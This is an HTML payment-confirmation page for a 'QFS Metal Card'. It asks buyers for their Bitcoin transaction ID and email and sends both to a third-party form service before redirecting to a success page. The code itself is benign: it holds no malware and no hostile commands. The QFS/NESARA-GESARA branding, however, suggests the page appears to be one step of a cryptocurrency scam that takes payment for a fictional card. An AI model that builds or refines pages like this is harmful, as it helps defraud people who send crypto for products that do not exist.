<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" type="image/png" href="https://github.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/blob/main/photo%201.jpg?raw=true">
<title>Order Confirmation â€” QFS Metal Card</title>

<style>
  :root {
    --bg:#020617;
    --glass-bg:rgba(255,255,255,0.07);
    --glass-border:rgba(255,255,255,0.18);
    --text:#e2e8f0;
    --muted:#94a3b8;
    --accent:#38bdf8;
    --accent2:#a855f7;
  }

  body {
    margin: 0;
    padding: 0;
    font-family: Inter, -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui;
    background: radial-gradient(circle at top, rgba(56,189,248,0.35), transparent 55%),
                radial-gradient(circle at bottom, rgba(147,51,234,0.35), transparent 60%),
                var(--bg);
    color: var(--text);
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }

  .container {
    width: 90%;
    max-width: 520px;
    padding: 40px 34px;
    background: var(--glass-bg);
    border-radius: 28px;
    border: 1px solid var(--glass-border);
    backdrop-filter: blur(28px);
    text-align:center;
  }

  .logo {
    width: 160px;
    display: block;
    margin: 0 auto 18px auto;
    filter: drop-shadow(0 8px 14px rgba(56,189,248,0.25));
  }

  h1 {
    font-size: 32px;
    margin-bottom: 8px;
    font-weight: 800;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }

  p {
    color: var(--muted);
    font-size: 16px;
    line-height: 1.6;
    margin-bottom: 12px;
  }

  strong { color: var(--accent); }

  input[type="text"],
  input[type="email"] {
    width: 100%;
    padding: 14px;
    margin-top: 4px;
    border-radius: 14px;
    border: 1px solid rgba(255,255,255,0.18);
    background: rgba(255,255,255,0.06);
    color: var(--text);
    font-size: 16px;
    outline: none;
  }

  .btn {
    width: 100%;
    margin-top: 30px;
    padding: 15px;
    font-size: 18px;
    font-weight: 700;
    border-radius: 14px;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    color: #fff;
    border: none;
    cursor: pointer;
  }
</style>
</head>

<body>
<div class="container">

  <img class="logo"
       src="https://github.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/blob/main/photo%201.jpg?raw=true"
       alt="Brand Logo">

  <h1>Payment Confirmation</h1>
  <p><strong>Final Step Required</strong></p>
  <p>Enter your Transaction Hash (TXID) and email to complete your order confirmation.</p>

  <form id="confirmForm"
        action="https://formbold.com/s/oW1Ay"
        method="POST">

    <!-- Redirect after submit -->
    <input type="hidden" name="redirect"
           value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-payment.html">

    <!-- Order ID -->
    <input type="hidden" id="orderIdField" name="Order ID">

    <label>Transaction Hash (TXID)</label>
    <input type="text" name="TXID" placeholder="Enter your TXID" required>

    <label>Email Address</label>
    <input type="email" name="Email" placeholder="Enter your email" required>

    <button type="submit" class="btn">Submit Confirmation</button>
  </form>

</div>

<script>
/* Retrieve Order ID from localStorage or URL */
(function(){
    const params = new URLSearchParams(window.location.search);
    const fromUrl = params.get("order");
    const fromLocal = localStorage.getItem("qfsOrderId");

    const orderId = fromUrl || fromLocal || "";
    document.getElementById("orderIdField").value = orderId;
})();
</script>

</body>
</html>
